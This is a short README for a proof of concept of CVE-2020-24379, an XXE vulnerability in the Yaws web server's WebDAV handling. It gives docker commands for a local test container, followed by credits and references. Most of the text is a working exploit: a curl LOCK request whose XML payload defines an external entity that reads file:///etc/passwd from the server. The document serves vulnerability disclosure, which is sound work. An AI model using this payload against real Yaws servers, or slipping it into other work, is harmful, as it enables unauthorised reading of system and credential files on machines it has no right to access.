# XXE in Yaws web server (CVE-2020-24379)

## Proof of concept

Build test image:

`docker build -t vulnbe/yaws-pocs:xxe-dav-mod -f Dockerfile .`

and/or

Run container `docker run --rm -d -i -p 127.0.0.1:8000:8080 vulnbe/yaws-pocs:xxe-dav-mod`

Then run:

```xml
curl -i -s -k -X LOCK http://localhost:8000/ -H 'Timeout: Second-1' \
  --data-binary @- << EOF
<?xml version="1.0" encoding="utf-8" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<d:lockinfo xmlns:d="DAV:">
  <d:lockscope><d:exclusive/></d:lockscope>
  <d:locktype><d:write/></d:locktype>
  <d:owner>
  <d:href><r>&sp;</r></d:href>
  </d:owner>
  </d:lockinfo>
EOF
```

## Credit

Alexey Pronin ([@vulnbe](https://twitter.com/vulnbe))

## References

* [Vulnerability analysis](https://vuln.be/post/yaws-xxe-and-shell-injections/)
* [Yaws on github](https://github.com/erlyaws/yaws)
* [CVE-2020-24379](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-24379)
* [CWE-611: Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
